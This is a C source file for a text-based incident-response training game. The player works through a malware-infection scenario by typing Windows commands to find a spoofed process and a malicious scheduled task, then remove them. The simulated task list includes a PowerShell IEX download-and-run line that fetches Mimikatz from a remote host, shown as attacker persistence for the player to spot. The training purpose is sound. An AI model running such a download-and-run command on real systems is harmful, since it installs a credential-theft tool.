#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define MAX_ARGS 10
#define MAX_LENGTH 256


void mainMenu(char *userMenuInput, size_t size) {
    char *menuPage = 
            "\n\n"
            "====================================================\n"
            "|   CyberResponder Playbook Console //////         |\n"
            "| ================================================ |\n"
            "|   1. Respond  <--------------------------------- |\n"
            "|   2. Playbook  <-------------------------------- |\n"
            "|   3. Exit  <------------------------------------ |\n"
            "====================================================\n";

    printf("%s", menuPage);
    printf("Please select an option: ");
    fgets(userMenuInput, size, stdin);
    userMenuInput[strcspn(userMenuInput, "\n")] = 0;
    return;
}


void helpMenu() {

    char *helpPage = 
        "=================================================================\n"
        "| Command       | Description                                   |\n"
        "|===============================================================|\n"
        "| mstsc         | Interactively connect to a remote desktop.    |\n"
        "| tasklist      | List the processes.                           |\n"
        "| taskkill      | Kill a process.                               |\n"
        "| schtasks      | Manage scheduled tasks.                       |\n"
        "=================================================================\n";
    printf("%s", helpPage);
    return;
}


char *userInput(char *command, size_t size) {
    do {
        printf("> ");
        if (fgets(command, size, stdin) == NULL) {
            return command;
        }
        command[strcspn(command, "\n")] = 0;
    } while (strlen(command) == 0);
    return command;
}


void strToLower (char *str) {
    while (*str) {
        *str = tolower((unsigned char)*str);
        str++;
    }
}


char *trimStr(char *str) {
    char *endStr;

    while (isspace((unsigned char)*str)) {
        str++;
    }

    if (*str == '\0') {
        return str;
    }

    endStr = str + strlen(str) - 1;
    while (endStr > str && isspace((unsigned char)*endStr)) {
        endStr--;
    }
    *(endStr + 1) = '\0';

    return str;
}


int parseCmd(char *cmd, char *args[MAX_ARGS]) {
    char *pointer = cmd;
    char *pointerStart = cmd;
    int argsCounter = 0;
    int spaceCounter = 0;

    while (*pointer) {
        if (isspace((unsigned char)*pointer) && spaceCounter < 1) {
            *pointer = '\0';
            if (*pointerStart != '\0') {
                pointerStart = trimStr(pointerStart);
                strToLower(pointerStart);
                args[argsCounter++] = pointerStart;
            }
            pointerStart = pointer + 1;
            spaceCounter++;
        } else if (*pointer == '/') {
            *pointer = '\0';
            if (*pointerStart != '\0') {
                pointerStart = trimStr(pointerStart);
                strToLower(pointerStart);
                args[argsCounter++] = pointerStart;
            }
            pointerStart = pointer + 1; 
        }
        pointer++;
    }

    if (*pointerStart != '\0') {
        pointerStart = trimStr(pointerStart);
        strToLower(pointerStart);
        args[argsCounter++] = pointerStart;
    }

    return argsCounter;
}


int compareCmd(char *cmd, char *ans) {
    char cmdBuffer[MAX_LENGTH];
    char ansBuffer[MAX_LENGTH];
    char *cmdArgs[MAX_ARGS], *ansArgs[MAX_ARGS];

    strcpy(cmdBuffer, cmd);
    strcpy(ansBuffer, ans);

    int cmdCounter = parseCmd(cmdBuffer, cmdArgs);
    int ansCounter = parseCmd(ansBuffer, ansArgs);

    if (cmdCounter == 0 || ansCounter == 0 || strcmp(cmdArgs[0], ansArgs[0]) != 0) {
        return 0;
    }

    int matchTrack[MAX_ARGS] = {0};
    for (int i = 1; i < ansCounter; i++) {
        int matched = 0;
        for (int j = 1; j < cmdCounter; j++) {
            if (!matchTrack[j] && strcmp(ansArgs[i], cmdArgs[j]) == 0){
                matchTrack[j] = 1;
                matched = 1;
                break;
            }
        }
        if (!matched) {
            return 0;
        }
    }

    return 1;
}


int processInput(char *command, size_t size, char *answer, int *life) {
    char *input = userInput(command, size);
    int checkAns = compareCmd(input, answer);

    while (checkAns == 0) {
        if (strcmp(input, "back") == 0) {
            return 0;
        } else if (strcmp(input, "help") == 0) {
            helpMenu();
        } else {
            (*life)++;
            printf("Wrong or unrecognized command. Please try again.\n");
            if (*life >= 3) {
                printf("\nGame over. You have been compromised!");
                return 0;
            }
        }
        input = userInput(command, size);
        checkAns = compareCmd(input, answer);
    }

    return 1;
}


void scenarioOne() {
    int status;
    int life = 0;
    char command[200];
    char *answer;
    char *scenarioBackground = 
            "\n\nCASE IR001: UNKNOWN MALWARE INFECTION ON A WORKSTATION\n"
            "Meeps Security has identified that endpoint CORP\\WST1 (192.168.50.100) has been compromised by a malware.\n"
            "According to the client's Cyber Threat Intelligence group, the malware is known to spoof well-known Microsoft\n"
            "processes. It was also observed that the threat actor behind the attack uses scheduled tasks to maintain per-\n"
            "sistence.\n\n"
            "OSINT research also showed that organizations that have been compromised by the same threat actor reported\n"
            "a suspicious 'Temp' folder located in the root drive, where the exfiltrated data is being staged. Furthermore,\n"
            "an adisory from CISA confirms that the threat actor utilizes EC2 instances for command & control (C2).\n\n"
            "As one of the incident responders, follow the response playbook to remediate the risk.\n";

    printf ("%s", scenarioBackground);
    printf("\n1. Beginning the response, connect to the infected machine as an admin via RDP using the IP address and default port.\n");
    answer = "mstsc /v:192.168.50.100 /admin";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf("Connecting to CORP\\WST1 as an admin...\nConnected!\n");
    } else {
        return;
    }
    


    printf("\n2. Identify the running processes in the infected machine.\n");
    answer = "tasklist /fi \"status eq running\"";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *runningProcesses = 
                "Running Processes:\n"
                "====================================================\n"
                "| Image Name          | PID     | Mem Usage        |\n"
                "====================================================\n"
                "| explorer.exe        | 11600   | 257,520 K        |\n"
                "| msedge.exe          | 6556    | 310,000 K        |\n"
                "| explorerr.exe       | 4496    | 769,334 K        |\n"
                "====================================================\n";
        printf("%s", runningProcesses);
    } else {
        return;
    }


    printf("\n3. Analyze the list of running processes, identify which is malicious, and kill it with its PID.\n");
    answer = "taskkill /pid 4496";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf ("Process explorerr.exe:4496 successfully killed.\n");
    } else {
        return;
    }

    printf("\n4. Knowing the method of persistence employed by the threat actor, list the configured scheduled tasks in the system in verbose mode.\n");
    answer = "schtasks /query /v";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *scheduledTasks = 
                "Scheduled Tasks:\n"
                "==================================================================================================\n"
                "| Task Name      | Author     | Trigger              | Task to Run                               |\n"
                "==================================================================================================\n"
                "| npcapwatchdog  | UncleSocks | At system startup    | C:\\Program Files\\Npcap\\CheckStatus.bat    |\n"
                "| MSUpdate       | UncleSocks | At logon of any      | C:\\Windows\\System32\\powershell.exe IEX    |\n"
                "|                                                      ((new-object netwebclient).downloadstring |\n"
                "|                                                      (https://ec2.aws.com/Mimikatz.ps1         |\n"
                "| MSEdgeUpdate   |            | At 1:30 PM every day | C:\\Program Files (x86)\\Microsoft\\Edge     |\n"
                "|                                                      Update\\MicrosoftEdgeUpdate.exe \\c         |\n"
                "==================================================================================================\n";
            printf("%s", scheduledTasks);
    } else {
        return;
    }

    printf("\n5. Identify and delete the scheduled task used for persistence.\n");
    answer = "schtasks /delete /tn MSUpdate";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf ("Scheduled task 'MSUpdate' successfully deleted.\n");
    }

    return;

}


int main() {
    int running = 1;
    char menuSelected[MAX_LENGTH];
    while (running == 1) {
        mainMenu(menuSelected, sizeof(menuSelected));
        strToLower(menuSelected);
        if ((strcmp(menuSelected, "respond") == 0) || (strcmp(menuSelected, "1") == 0)) {
            scenarioOne();
        } else if ((strcmp(menuSelected, "playbook") == 0) || (strcmp(menuSelected, "2") == 0)) {
            printf("Go to playbook...");
        } else if ((strcmp(menuSelected, "exit") == 0) || (strcmp(menuSelected, "3") == 0)) {
            printf("Exiting...");
            running = 0;
        } else {
            printf("Invalid option selected. Please try again.");
        }
    }
    return 0;
}